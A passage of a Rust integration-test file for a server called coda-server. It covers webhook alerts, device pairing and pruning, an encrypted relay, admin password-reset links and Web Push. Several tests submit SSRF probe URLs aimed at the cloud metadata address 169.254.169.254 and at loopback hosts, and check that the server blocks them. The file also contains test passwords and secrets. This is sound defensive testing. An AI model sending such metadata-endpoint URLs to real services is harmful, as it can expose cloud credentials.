    assert!(initial_notif.notify_on_finished);

    // Without allow_local_webhook_test, http://127.0.0.1 and https://169.254.169.254 MUST fail SSRF check
    let ssrf_loopback = http
        .put(format!("{base}/api/v1/me/notifications"))
        .bearer_auth(&owner.token)
        .json(&json!({
            "generic_webhook_url": format!("http://{mock_addr}/hook/generic"),
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(ssrf_loopback.status(), reqwest::StatusCode::BAD_REQUEST);

    let ssrf_metadata = http
        .put(format!("{base}/api/v1/me/notifications"))
        .bearer_auth(&owner.token)
        .json(&json!({
            "generic_webhook_url": "https://169.254.169.254/latest/meta-data",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(ssrf_metadata.status(), reqwest::StatusCode::BAD_REQUEST);

    // Enable local loopback webhook test flag on this test server instance
    server
        .state
        .allow_local_webhook_test
        .store(true, std::sync::atomic::Ordering::SeqCst);

    // Metadata IP is STILL blocked even with allow_local_webhook_test=true!
    let ssrf_metadata_still_blocked = http
        .put(format!("{base}/api/v1/me/notifications"))
        .bearer_auth(&owner.token)
        .json(&json!({
            "generic_webhook_url": "http://169.254.169.254/latest/meta-data",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(
        ssrf_metadata_still_blocked.status(),
        reqwest::StatusCode::BAD_REQUEST
    );

    // 3. Save Bark + Feishu + Discord + Generic webhooks & run POST /api/v1/me/notifications/test
    let saved_notif: coda_server::NotificationSettingsRecord = http
        .put(format!("{base}/api/v1/me/notifications"))
        .bearer_auth(&owner.token)
        .json(&json!({
            "bark_url": format!("http://{mock_addr}/hook/bark"),
            "feishu_webhook_url": format!("http://{mock_addr}/hook/feishu"),
            "discord_webhook_url": format!("http://{mock_addr}/hook/discord"),
            "generic_webhook_url": format!("http://{mock_addr}/hook/generic"),
            "notify_on_needs_you": true,
            "notify_on_finished": true,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(saved_notif.feishu_webhook_url.ends_with("/hook/feishu"));

    let test_push: serde_json::Value = http
        .post(format!("{base}/api/v1/me/notifications/test"))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(test_push["ok"], true);
    assert_eq!(test_push["delivered_channels"].as_array().unwrap().len(), 4);
    assert!(test_push["errors"].as_array().unwrap().is_empty());

    let mut seen_test_channels = Vec::new();
    for _ in 0..4 {
        let (ch, payload) = tokio::time::timeout(std::time::Duration::from_secs(3), hook_rx.recv())
            .await
            .unwrap()
            .unwrap();
        if ch == "feishu" {
            assert_eq!(payload["msg_type"], "text");
        } else if ch == "discord" {
            assert!(payload["content"].as_str().unwrap().contains("Alert Test"));
        }
        seen_test_channels.push(ch);
    }
    seen_test_channels.sort();
    assert_eq!(
        seen_test_channels,
        vec!["bark", "discord", "feishu", "generic"]
    );

    // 4. Pair daemon via RFC 8628 device flow (gives BOTH daemon_host session_token AND daemon_relay_ticket!)
    let flow = start_device_login_flow(&base, "daemon", Some("Mac-Studio-090".into()), None)
        .await
        .unwrap();
    http.post(format!("{base}/api/v1/auth/device/approve"))
        .bearer_auth(&owner.token)
        .json(&json!({ "user_code": flow.user_code }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    let daemon_cfg = poll_device_login_once(&flow)
        .await
        .unwrap()
        .expect("daemon approved");
    let daemon_session_tok = daemon_cfg.session_token.clone().expect("daemon_host token");

    // Verify daemon_host session token cannot call controller endpoints (`PUT /api/v1/me/notifications` -> 403),
    // yet CAN call `POST /api/v1/daemon/alert`!
    assert_eq!(
        http.get(format!("{base}/api/v1/me/notifications"))
            .bearer_auth(&daemon_session_tok)
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::FORBIDDEN
    );

    // Dispatch alert #1 using `daemon_relay_ticket` bearer token
    let alert_resp_1: serde_json::Value = http
        .post(format!("{base}/api/v1/daemon/alert"))
        .bearer_auth(&daemon_cfg.daemon_relay_ticket)
        .json(&json!({
            "device_id": daemon_cfg.device_id,
            "device_name": "Mac-Studio-090",
            "session_name": "claude-refactor",
            "status": "needs_you",
            "cwd_basename": "/Users/private_org/coda",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(alert_resp_1["ok"], true);
    assert_eq!(alert_resp_1["dispatched"], 4);

    for _ in 0..4 {
        let (ch, payload) = tokio::time::timeout(std::time::Duration::from_secs(3), hook_rx.recv())
            .await
            .unwrap()
            .unwrap();
        let raw_s = serde_json::to_string(&payload).unwrap();
        assert!(
            !raw_s.contains("private_org"),
            "server must strip any parent path components from cwd_basename"
        );
        if ch == "generic" {
            assert_eq!(payload["cwd_basename"], "coda");
            assert_eq!(payload["status"], "needs_you");
        }
    }

    // Immediate duplicate within 60s for same (user, device, session, status) -> 429 rate limited!
    let dup_resp = http
        .post(format!("{base}/api/v1/daemon/alert"))
        .bearer_auth(&daemon_cfg.daemon_relay_ticket)
        .json(&json!({
            "device_id": daemon_cfg.device_id,
            "device_name": "Mac-Studio-090",
            "session_name": "claude-refactor",
            "status": "needs_you",
            "cwd_basename": "coda",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(dup_resp.status(), reqwest::StatusCode::TOO_MANY_REQUESTS);

    // Distinct status ("finished") using `daemon_host` session token -> succeeds immediately!
    let alert_resp_2: serde_json::Value = http
        .post(format!("{base}/api/v1/daemon/alert"))
        .bearer_auth(&daemon_session_tok)
        .json(&json!({
            "device_id": daemon_cfg.device_id,
            "device_name": "Mac-Studio-090",
            "session_name": "claude-refactor",
            "status": "finished",
            "cwd_basename": "coda",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(alert_resp_2["dispatched"], 4);
    for _ in 0..4 {
        let _ = tokio::time::timeout(std::time::Duration::from_secs(3), hook_rx.recv())
            .await
            .unwrap();
    }

    // Cross-tenant alert attempt MUST be rejected with 403
    let cross_alert = http
        .post(format!("{base}/api/v1/daemon/alert"))
        .bearer_auth(&other_user.token)
        .json(&json!({
            "device_id": daemon_cfg.device_id,
            "device_name": "Spoofed",
            "session_name": "spoof",
            "status": "needs_you",
            "cwd_basename": "coda",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(cross_alert.status(), reqwest::StatusCode::FORBIDDEN);

    // 5. Stale offline web device pruning (`login` 30-day auto-prune + `POST /api/v1/devices/prune-stale`)
    let reg_client = |name: &str, platform: &str| {
        let http = http.clone();
        let base = base.clone();
        let tok = owner.token.clone();
        let name = name.to_string();
        let platform = platform.to_string();
        async move {
            let id = StoredDeviceIdentity::generate(&name);
            http.post(format!("{base}/api/v1/devices/register-client"))
                .bearer_auth(&tok)
                .json(&json!({
                    "name": name,
                    "platform": platform,
                    "ed25519_pubkey": id.ed25519_public_b64,
                    "x25519_pubkey": id.x25519_public_b64,
                }))
                .send()
                .await
                .unwrap()
                .error_for_status()
                .unwrap()
                .json::<DeviceRecord>()
                .await
                .unwrap()
        }
    };

    let web_old = reg_client("Chrome 35d Old", "web").await;
    let web_recent = reg_client("Safari 2d Recent", "web").await;
    let web_online = reg_client("Arc Live Tab", "web").await;
    let ios_offline = reg_client("iPhone Offline", "ios").await;

    pg.execute(
        "UPDATE devices SET last_seen_at = NOW() - INTERVAL '35 days', is_online = FALSE WHERE id = $1",
        &[&web_old.id],
    )
    .await
    .unwrap();
    pg.execute(
        "UPDATE devices SET last_seen_at = NOW() - INTERVAL '2 days', is_online = FALSE WHERE id = $1",
        &[&web_recent.id],
    )
    .await
    .unwrap();
    pg.execute(
        "UPDATE devices SET is_online = TRUE WHERE id = $1",
        &[&web_online.id],
    )
    .await
    .unwrap();
    pg.execute(
        "UPDATE devices SET last_seen_at = NOW() - INTERVAL '40 days', is_online = FALSE WHERE id = $1",
        &[&ios_offline.id],
    )
    .await
    .unwrap();

    // Logging in auto-prunes >30d offline `web` client (`web_old`) while keeping `web_recent`, `web_online`, `ios_offline`, and `daemon`!
    let _relogin: AuthResponse = http
        .post(format!("{base}/api/v1/auth/login"))
        .json(&json!({
            "email_or_handle": "owner090",
            "password": "password-090-owner",
            "client_label": "web",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    let devs_after_login: Vec<DeviceRecord> = http
        .get(format!("{base}/api/v1/devices"))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(!devs_after_login.iter().any(|d| d.id == web_old.id));
    assert!(devs_after_login.iter().any(|d| d.id == web_recent.id));
    assert!(devs_after_login.iter().any(|d| d.id == web_online.id));
    assert!(devs_after_login.iter().any(|d| d.id == ios_offline.id));

    // Manual `POST /api/v1/devices/prune-stale` with empty body defaults `max_idle_days` to 0 -> sweeps `web_recent`!
    let prune_res: serde_json::Value = http
        .post(format!("{base}/api/v1/devices/prune-stale"))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(prune_res["ok"], true);
    assert_eq!(prune_res["pruned_count"], 1);

    let devs_after_prune: Vec<DeviceRecord> = http
        .get(format!("{base}/api/v1/devices"))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(!devs_after_prune.iter().any(|d| d.id == web_recent.id));
    assert!(devs_after_prune.iter().any(|d| d.id == web_online.id));
    assert!(devs_after_prune.iter().any(|d| d.id == ios_offline.id));
    assert!(devs_after_prune.iter().any(|d| d.id == daemon_cfg.device_id));

    // Verify self-revocation guard (#20 Bug #3): an offline/idle Web Console session (`_relogin`)
    // calling `prune-stale` MUST preserve both its own `auth_sessions.device_id` AND `exclude_device_id`!
    let extra_tab = reg_client("Second Idle Tab", "web").await;
    let stale_tab = reg_client("Stale Orphan Tab", "web").await;
    let caller_id = StoredDeviceIdentity::generate("Active Caller Tab");
    let caller_web: DeviceRecord = http
        .post(format!("{base}/api/v1/devices/register-client"))
        .bearer_auth(&_relogin.token)
        .json(&json!({
            "name": "Active Caller Tab",
            "platform": "web",
            "ed25519_pubkey": caller_id.ed25519_public_b64,
            "x25519_pubkey": caller_id.x25519_public_b64,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    let safe_prune: serde_json::Value = http
        .post(format!("{base}/api/v1/devices/prune-stale"))
        .bearer_auth(&_relogin.token)
        .json(&json!({
            "max_idle_days": 0,
            "exclude_device_id": extra_tab.id,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(safe_prune["ok"], true);
    assert_eq!(safe_prune["pruned_count"], 1);
    let devs_after_safe_prune: Vec<DeviceRecord> = http
        .get(format!("{base}/api/v1/devices"))
        .bearer_auth(&_relogin.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(devs_after_safe_prune.iter().any(|d| d.id == caller_web.id));
    assert!(devs_after_safe_prune.iter().any(|d| d.id == extra_tab.id));
    assert!(!devs_after_safe_prune.iter().any(|d| d.id == stale_tab.id));

    // 6. Verify live E2EE BootstrapWorkspace over Raw TCP Relay
    let cfg_bg = daemon_cfg.clone();
    let daemon_task = tokio::spawn(async move {
        let _ = coda_daemon::run_daemon_once(&cfg_bg, Some("raw_tcp_no_sni")).await;
    });
    let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(5);
    loop {
        let devs: Vec<DeviceRecord> = http
            .get(format!("{base}/api/v1/devices"))
            .bearer_auth(&owner.token)
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        if devs.iter().any(|d| d.id == daemon_cfg.device_id && d.is_online) {
            break;
        }
        assert!(tokio::time::Instant::now() < deadline, "daemon online timeout");
        tokio::time::sleep(std::time::Duration::from_millis(40)).await;
    }

    let mut ctrl_id = StoredDeviceIdentity::generate("Controller Mac");
    let ctrl_dev: DeviceRecord = http
        .post(format!("{base}/api/v1/devices/register-client"))
        .bearer_auth(&owner.token)
        .json(&json!({
            "name": "Controller Mac",
            "platform": "macos",
            "ed25519_pubkey": ctrl_id.ed25519_public_b64,
            "x25519_pubkey": ctrl_id.x25519_public_b64,
        }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    ctrl_id.device_id = Some(ctrl_dev.id);

    let relay_cfg = mint_peer_relay_config(
        &base,
        &owner.token,
        ctrl_dev.id,
        daemon_cfg.device_id,
        &daemon_cfg.identity.ed25519_public_b64,
        &daemon_cfg.identity.x25519_public_b64,
    )
    .await
    .unwrap();
    let mut smart = SmartPeerClient::connect_auto(
        ctrl_id,
        ctrl_dev.id,
        daemon_cfg.device_id,
        PeerIdentityPin {
            ed25519_pub_b64: daemon_cfg.identity.ed25519_public_b64.clone(),
            x25519_pub_b64: daemon_cfg.identity.x25519_public_b64.clone(),
        },
        vec![],
        None,
        Some(relay_cfg),
    )
    .await
    .unwrap();

    let tmp_parent = std::env::temp_dir().join(format!("coda-e2e-bw-{}", uuid::Uuid::new_v4()));
    let bw_reply = smart
        .request(
            &PeerMessage::BootstrapWorkspace {
                req_id: "e2e-bw-1".into(),
                parent_dir: tmp_parent.to_string_lossy().to_string(),
                folder_name: "new-agent-repo".into(),
                git_clone_url: None,
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap();
    match bw_reply {
        PeerMessage::BootstrapWorkspaceResult {
            ok, workspace_path, ..
        } => {
            assert!(ok);
            assert!(std::path::Path::new(&workspace_path).is_dir());
        }
        other => panic!("unexpected reply: {other:?}"),
    }
    let _ = std::fs::remove_dir_all(&tmp_parent);

    // 7. Verify SetVoiceConfig masks non-empty API key (`••••••••`) & TranscribeAudio SSRF guard over E2EE
    let vc_ack = smart
        .request(
            &PeerMessage::SetVoiceConfig {
                req_id: "e2e-vc-ssrf".into(),
                config: VoiceModelConfig {
                    provider: "openai".into(),
                    base_url: "https://[::ffff:169.254.169.254]/v1".into(),
                    api_key: "sk-secret-e2e-v1".into(),
                    model: "whisper-1".into(),
                },
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap();
    match vc_ack {
        PeerMessage::VoiceConfigAck { ok, config, .. } => {
            assert!(ok);
            assert_eq!(config.api_key, "••••••••");
        }
        other => panic!("unexpected VoiceConfigAck: {other:?}"),
    }
    let ta_reply = smart
        .request(
            &PeerMessage::TranscribeAudio {
                req_id: "e2e-ta-ssrf".into(),
                audio_b64: base64::Engine::encode(
                    &base64::engine::general_purpose::STANDARD,
                    b"RIFF....WAVEfmt ",
                ),
                mime_type: "audio/wav".into(),
                filename: "voice.wav".into(),
                language: Some("en".into()),
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap();
    match ta_reply {
        PeerMessage::TranscribeAudioResult { ok, error, .. } => {
            assert!(!ok);
            assert!(error.as_deref().is_some_and(|e| e.contains("SSRF")));
        }
        other => panic!("unexpected TranscribeAudioResult: {other:?}"),
    }

    daemon_task.abort();
    mock_server_task.abort();
}

#[tokio::test]
async fn test_v110_admin_friend_reset_vapid_web_push_and_prompt_snippets() {
    use base64::engine::general_purpose::URL_SAFE_NO_PAD as B64_URL;
    use ring::{
        agreement::{EphemeralPrivateKey, ECDH_P256},
        rand::{SecureRandom, SystemRandom},
        signature::{UnparsedPublicKey as VerifyPublicKey, ECDSA_P256_SHA256_FIXED},
    };

    let _guard = DB_TEST_LOCK.get_or_init(|| Mutex::new(())).lock().await;
    let db_url = std::env::var("TEST_DATABASE_URL")
        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
    let pg = acquire_clean_test_db(&db_url).await;

    // Prepare a synthetic `web_dist` folder to verify `/sw.js` headers & `/reset-password` SPA route.
    let tmp_web_dist = std::env::temp_dir().join(format!("coda-e2e-webdist-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&tmp_web_dist).unwrap();
    std::fs::write(
        tmp_web_dist.join("index.html"),
        "<!doctype html><html><body>coda-spa</body></html>",
    )
    .unwrap();
    std::fs::write(
        tmp_web_dist.join("sw.js"),
        "self.addEventListener('push', () => {});",
    )
    .unwrap();

    let server = start_full_server_with_options(
        &db_url,
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        b"integration-test-hmac-secret-v110-2026".to_vec(),
        None,
        Some(tmp_web_dist.clone()),
        ServerOptions::default(),
    )
    .await
    .unwrap();

    let base = format!("http://{}", server.http_addr);
    let http = reqwest::Client::new();

    // 1. Verify `/sw.js` headers (`Service-Worker-Allowed: /`, `Cache-Control: no-cache`),
    //    `/reset-password` SPA serving, and `/api/v1/site-info` alias.
    let sw_resp = http.get(format!("{base}/sw.js")).send().await.unwrap();
    assert_eq!(sw_resp.status(), reqwest::StatusCode::OK);
    assert_eq!(
        sw_resp
            .headers()
            .get("service-worker-allowed")
            .and_then(|v| v.to_str().ok()),
        Some("/")
    );
    assert_eq!(
        sw_resp
            .headers()
            .get("cache-control")
            .and_then(|v| v.to_str().ok()),
        Some("no-cache")
    );

    let reset_spa = http
        .get(format!("{base}/reset-password?token=rst_example"))
        .send()
        .await
        .unwrap();
    assert_eq!(reset_spa.status(), reqwest::StatusCode::OK);
    assert!(reset_spa.text().await.unwrap().contains("coda-spa"));

    let site_info_alias: serde_json::Value = http
        .get(format!("{base}/api/v1/site-info"))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(site_info_alias["service"], "coda-server");

    // 2. Register Owner (Admin) + Invite Friend Leo + Pair Daemons
    let owner: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "admin110@coda.dev",
            "handle": "admin110",
            "display_name": "Admin 110",
            "password": "owner-password-110",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(owner.user.is_admin);

    let invite: InviteCodeRecord = http
        .post(format!("{base}/api/v1/invites"))
        .bearer_auth(&owner.token)
        .json(&json!({ "note": "Leo v1.1", "max_uses": 2, "valid_days": 7 }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    let leo: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "leo110@friends.dev",
            "handle": "leo110",
            "display_name": "Leo 110",
            "password": "leo-old-password-110",
            "invite_code": invite.code,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(!leo.user.is_admin);

    // Pair an admin daemon (to verify `scope == "full"` is strictly required even for an admin's daemon_host token!)
    let owner_flow = start_device_login_flow(&base, "daemon", Some("Admin-Daemon".into()), None)
        .await
        .unwrap();
    http.post(format!("{base}/api/v1/auth/device/approve"))
        .bearer_auth(&owner.token)
        .json(&json!({ "user_code": owner_flow.user_code }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    let owner_daemon = poll_device_login_once(&owner_flow)
        .await
        .unwrap()
        .expect("admin daemon approved");
    let owner_daemon_tok = owner_daemon.session_token.clone().unwrap();

    // Pair a daemon for Leo (to verify password reset preserves paired daemon_host session & relay ticket!)
    let leo_flow = start_device_login_flow(&base, "daemon", Some("Leo-Linux-Box".into()), None)
        .await
        .unwrap();
    http.post(format!("{base}/api/v1/auth/device/approve"))
        .bearer_auth(&leo.token)
        .json(&json!({ "user_code": leo_flow.user_code }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    let leo_daemon = poll_device_login_once(&leo_flow)
        .await
        .unwrap()
        .expect("leo daemon approved");
    let leo_daemon_tok = leo_daemon.session_token.clone().unwrap();

    // Non-admin Leo MUST receive 403 on admin endpoints
    assert_eq!(
        http.get(format!("{base}/api/v1/admin/users"))
            .bearer_auth(&leo.token)
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::FORBIDDEN
    );
    assert_eq!(
        http.post(format!("{base}/api/v1/admin/users/{}/reset-link", owner.user.id))
            .bearer_auth(&leo.token)
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::FORBIDDEN
    );
    // Admin's `daemon_host` scoped token MUST ALSO receive 403 (`auth.scope == "full"` required!)
    assert_eq!(
        http.get(format!("{base}/api/v1/admin/users"))
            .bearer_auth(&owner_daemon_tok)
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::FORBIDDEN
    );

    // Admin fetches Friends Directory
    let admin_users_resp: serde_json::Value = http
        .get(format!("{base}/api/v1/admin/users"))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    let users_arr = admin_users_resp["users"].as_array().unwrap();
    assert_eq!(users_arr.len(), 2);
    let leo_entry = users_arr
        .iter()
        .find(|u| u["handle"] == "leo110")
        .expect("leo in admin users list");
    assert_eq!(leo_entry["is_admin"], false);
    assert_eq!(leo_entry["total_devices"], 1);
    assert_eq!(leo_entry["online_devices"], 0);
    assert!(leo_entry["last_login_at"].is_string());

    // 3. Admin issues Passwordless Friend Reset Link -> SHA-256 at rest, full URL parsing,
    //    replay rejection, `scope = 'full'` revocation, and daemon preservation!
    let reset_resp: serde_json::Value = http
        .post(format!("{base}/api/v1/admin/users/{}/reset-link", leo.user.id))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(reset_resp["ok"], true);
    assert_eq!(reset_resp["handle"], "leo110");
    assert_eq!(reset_resp["expires_in_secs"], 86_400);
    let reset_token = reset_resp["reset_token"].as_str().unwrap().to_string();
    let reset_url = reset_resp["reset_url"].as_str().unwrap().to_string();
    assert!(reset_token.starts_with("rst_") && reset_token.len() >= 36);
    assert_eq!(reset_url, format!("{base}/reset-password?token={reset_token}"));

    // Ensure raw token is NEVER stored in plaintext in PostgreSQL
    let raw_in_db: i64 = pg
        .query_one(
            "SELECT COUNT(*)::BIGINT FROM password_reset_tokens WHERE token_sha256 = $1",
            &[&reset_token],
        )
        .await
        .unwrap()
        .get(0);
    assert_eq!(raw_in_db, 0);

    // Too-short password (< 8 bytes) must return 400 WITHOUT burning the one-time reset token
    let short_pw_resp = http
        .post(format!("{base}/api/v1/auth/reset-password"))
        .json(&json!({
            "token": reset_url,
            "new_password": "short",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(short_pw_resp.status(), reqwest::StatusCode::BAD_REQUEST);

    // Consume reset link by pasting the full URL (with surrounding whitespace)
    let consumed_ok: serde_json::Value = http
        .post(format!("{base}/api/v1/auth/reset-password"))
        .json(&json!({
            "token": format!("  {reset_url}  "),
            "new_password": "leo-fresh-password-2026!",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(consumed_ok["ok"], true);
    assert_eq!(consumed_ok["handle"], "leo110");

    // Replaying the same reset token MUST be rejected!
    let replay_resp = http
        .post(format!("{base}/api/v1/auth/reset-password"))
        .json(&json!({
            "token": reset_token,
            "new_password": "another-password-9999",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(replay_resp.status(), reqwest::StatusCode::BAD_REQUEST);

    // Leo's old `scope = 'full'` session MUST be revoked (401), while Leo's paired daemon stays authenticated!
    assert_eq!(
        http.get(format!("{base}/api/v1/auth/me"))
            .bearer_auth(&leo.token)
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::UNAUTHORIZED
    );
    assert_eq!(
        http.get(format!("{base}/api/v1/relay/trusted-peers"))
            .bearer_auth(&leo_daemon_tok)
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::OK
    );
    assert_eq!(
        http.get(format!("{base}/api/v1/relay/trusted-peers"))
            .header("x-coda-relay-ticket", &leo_daemon.daemon_relay_ticket)
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::OK
    );

    // Old password rejected, new password succeeds!
    assert_eq!(
        http.post(format!("{base}/api/v1/auth/login"))
            .json(&json!({
                "email_or_handle": "leo110",
                "password": "leo-old-password-110",
            }))
            .send()
            .await
            .unwrap()
            .status(),
        reqwest::StatusCode::UNAUTHORIZED
    );
    let leo_relogin: AuthResponse = http
        .post(format!("{base}/api/v1/auth/login"))
        .json(&json!({
            "email_or_handle": "leo110",
            "password": "leo-fresh-password-2026!",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    // 4. Standard W3C VAPID Web Push (`RFC 8292 + RFC 8291 aes128gcm` + SSRF + 410 auto-prune)
    let vapid_info: coda_server::VapidPublicKeyResponse = http
        .get(format!("{base}/api/v1/push/vapid-public-key"))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(vapid_info.enabled);
    let vapid_pub_bytes = coda_server::web_push::decode_flexible_b64(&vapid_info.public_key).unwrap();
    assert_eq!(vapid_pub_bytes.len(), 65);
    assert_eq!(vapid_pub_bytes[0], 0x04);

    // Verify `server_kv` persistence across reload
    let reloaded_wp = coda_server::WebPushService::load_or_init(&server.state.db)
        .await
        .unwrap();
    assert_eq!(reloaded_wp.public_key_b64url(), vapid_info.public_key);

    // Spin up mock W3C Web Push service capturing headers + encrypted body
    #[derive(Debug)]
    struct CapturedWebPush {
        authorization: String,
        content_encoding: String,
        ttl: String,
        urgency: String,
        body: Vec<u8>,
    }
    let (wp_tx, mut wp_rx) = tokio::sync::mpsc::unbounded_channel::<CapturedWebPush>();
    let wp_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let wp_addr = wp_listener.local_addr().unwrap();
    let wp_router = axum::Router::new()
        .route(
            "/push/active",
            axum::routing::post({
                let tx = wp_tx.clone();
                move |headers: axum::http::HeaderMap, body: axum::body::Bytes| {
                    let tx = tx.clone();
                    async move {
                        let get_h = |k: &str| {
                            headers
                                .get(k)
                                .and_then(|v| v.to_str().ok())
                                .unwrap_or("")
                                .to_string()
                        };
                        let _ = tx.send(CapturedWebPush {
                            authorization: get_h("authorization"),
                            content_encoding: get_h("content-encoding"),
                            ttl: get_h("ttl"),
                            urgency: get_h("urgency"),
                            body: body.to_vec(),
                        });
                        axum::http::StatusCode::CREATED
                    }
                }
            }),
        )
        .route(
            "/push/stale",
            axum::routing::post(|| async { axum::http::StatusCode::GONE }),
        );
    let wp_server_task = tokio::spawn(async move {
        let _ = axum::serve(wp_listener, wp_router).await;
    });

    let rng = SystemRandom::new();
    let ua_priv_1 = EphemeralPrivateKey::generate(&ECDH_P256, &rng).unwrap();
    let ua_pub_1 = ua_priv_1.compute_public_key().unwrap();
    let mut auth_sec_1 = [0u8; 16];
    rng.fill(&mut auth_sec_1).unwrap();

    // Without allow_local_webhook_test, http://127.0.0.1 MUST be blocked by SSRF policy
    let blocked_sub = http
        .post(format!("{base}/api/v1/me/web-push/subscribe"))
        .bearer_auth(&leo_relogin.token)
        .json(&json!({
            "endpoint": format!("http://{wp_addr}/push/active"),
            "keys": {
                "p256dh": B64_URL.encode(ua_pub_1.as_ref()),
                "auth": B64_URL.encode(auth_sec_1),
            },
            "user_agent": "Safari iOS PWA",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(blocked_sub.status(), reqwest::StatusCode::BAD_REQUEST);

    server
        .state
        .allow_local_webhook_test
        .store(true, std::sync::atomic::Ordering::SeqCst);

    // Metadata IP is STILL blocked even with allow_local_webhook_test=true
    let blocked_meta = http
        .post(format!("{base}/api/v1/me/web-push/subscribe"))
        .bearer_auth(&leo_relogin.token)
        .json(&json!({
            "endpoint": "http://169.254.169.254/latest/meta-data",
            "keys": {
                "p256dh": B64_URL.encode(ua_pub_1.as_ref()),
                "auth": B64_URL.encode(auth_sec_1),
            },
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(blocked_meta.status(), reqwest::StatusCode::BAD_REQUEST);

    // Subscribe both active (201) and stale (410) push endpoints
    let sub_active_res: serde_json::Value = http
        .post(format!("{base}/api/v1/me/web-push/subscribe"))
        .bearer_auth(&leo_relogin.token)
        .json(&json!({
            "endpoint": format!("http://{wp_addr}/push/active"),
            "keys": {
                "p256dh": B64_URL.encode(ua_pub_1.as_ref()),
                "auth": B64_URL.encode(auth_sec_1),
            },
            "user_agent": "Safari iOS PWA 18.4",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(sub_active_res["ok"], true);
    assert_eq!(sub_active_res["web_push_count"], 1);

    let sub_stale_res: serde_json::Value = http
        .post(format!("{base}/api/v1/me/web-push/subscribe"))
        .bearer_auth(&leo_relogin.token)
        .json(&json!({
            "endpoint": format!("http://{wp_addr}/push/stale"),
            "keys": {
                "p256dh": B64_URL.encode(ua_pub_1.as_ref()),
                "auth": B64_URL.encode(auth_sec_1),
            },
            "user_agent": "Old Uninstalled Browser",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(sub_stale_res["web_push_count"], 2);

    let notif_with_wp: coda_server::NotificationSettingsRecord = http
        .get(format!("{base}/api/v1/me/notifications"))
        .bearer_auth(&leo_relogin.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(notif_with_wp.web_push_count, 2);

    // Trigger `POST /api/v1/me/notifications/test` -> delivers encrypted `web_push` + auto-deletes `410 Gone`!
    let test_wp_res: serde_json::Value = http
